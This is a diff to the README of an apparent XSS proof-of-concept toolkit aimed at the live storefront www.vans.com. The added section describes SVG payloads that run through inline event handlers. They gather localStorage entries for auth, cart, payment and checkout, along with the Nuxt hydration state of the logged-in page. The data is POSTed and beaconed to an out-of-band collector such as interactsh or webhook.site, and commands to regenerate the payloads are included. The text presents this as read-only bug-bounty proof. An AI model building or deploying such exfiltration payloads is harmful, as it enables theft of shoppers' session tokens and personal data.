@@ -102,10 +102,12 @@ and the `<BASE>/fired?d=` beacon.
 Open a delivery URL in a browser (Burp browser works). You should see:
 
 * a red full-width banner: `XSS EXECUTED on www.vans.com`
-* an `alert('XSS on www.vans.com')`
-* `window.__XSS_FIRED === true` and `document.title === 'XSS:www.vans.com'`
-* a Network entry for `<BASE>/fired?d=www.vans.com&s=<sink>` (or the `fired` file
-  on a static host)
+* a fixed, high-z-index panel titled **XSS EXFILTRATION PROOF** listing every
+  harvested localStorage key + value preview and the `window.top.__NUXT__`
+  state (see section 8) - this is the screenshot proof
+* `window.__XSS_FIRED === true` and `document.title === 'XSS EXFIL PROOF - www.vans.com'`
+* a Network entry `POST <EXFIL>` plus a `GET <EXFIL>?d=www.vans.com&n=<count>&k=<keys>`
+  image beacon (both land in the OOB collector you configured)
 
 ## 7. Tree
 
@@ -121,5 +123,48 @@ vfdp-customs-prod-pdm/configurations/nora-en-us-sfcc-canvas/{configuration,endpo
 tools/setbase.sh
 ```
 
-Payloads are **non-destructive**: they set JS markers, draw an overlay, call
-`alert()`, and fire a beacon. They do not modify data on the target.
+Payloads are **non-destructive**: they set JS markers, draw an overlay, read
+localStorage / hydration state, and fire a beacon. They do not modify data on
+the target and make no account mutations.
+
+## 8. Impact payload - localStorage + `window.top.__NUXT__` harvest
+
+The three SVG payloads are impact variants, not just proof-of-execution. The
+customizer injects SVG through `innerHTML`, so `<script>` does not run; the
+payload rides inline event handlers (`onerror` on a broken `<img>` and `onbegin`
+on an SVG `<animate>`), which the HTML parser does execute. On execution the
+handler (READ-ONLY) does:
+
+1. harvests every `localStorage` entry whose key matches
+   `/auth|cart|favorit|user|pay|loyal|profile|checkout/i` (value truncated to
+   400 chars) - e.g. `auth_US`, `cart_US`, `favorites_US`, `checkout_US`;
+   (this works because the toolkit iframe is **same-origin** with the top
+   storefront, so the iframe reads the storefront's persisted store)
+2. reads `window.top.__NUXT__` - top-level keys plus `.state`, `.data` and
+   `.pinia` - and any `__pinia` / `__APOLLO_STATE__` globals, i.e. the live
+   Nuxt hydration state of the logged-in storefront;
+3. renders the **XSS EXFILTRATION PROOF** overlay: red banner, match counter,
+   and a per-key table (screenshot-able at 1440x900);
+4. POSTs the harvested JSON to `EXFIL` (`mode:'no-cors'`, text/plain body up to
+   60 KB) and fires an `<img>` GET beacon
+   `EXFIL?d=<domain>&n=<count>&k=<keys>` as an independent second channel;
+5. sets `window.__XSS_FIRED = true` and `document.title`.
+
+`EXFIL` is one constant at the top of `tools/gen_exfil_svg.py`:
+
+```bash
+EXFIL=https://<your-id>.oast.me/exfil python3 tools/gen_exfil_svg.py   # regenerate all 3 SVGs
+```
+
+The shipped default is an interactsh collector (ephemeral). A static host
+(raw.githubusercontent.com) cannot log requests, so point `EXFIL` at your own
+interactsh / webhook.site / Burp Collaborator endpoint before deploying.
+Regenerating rewrites only the 3 SVGs; re-run `tools/setbase.sh <base>` if you
+also changed the base, then commit + push.
+
+Validate locally (injects the payload through `innerHTML` and asserts the
+overlay, the harvest and the marker globals):
+
+```bash
+python3 tools/exfil_harness.py     # -> VERDICT: PASS, writes tools/EXFIL_OVERLAY_SCREENSHOT.png
+```
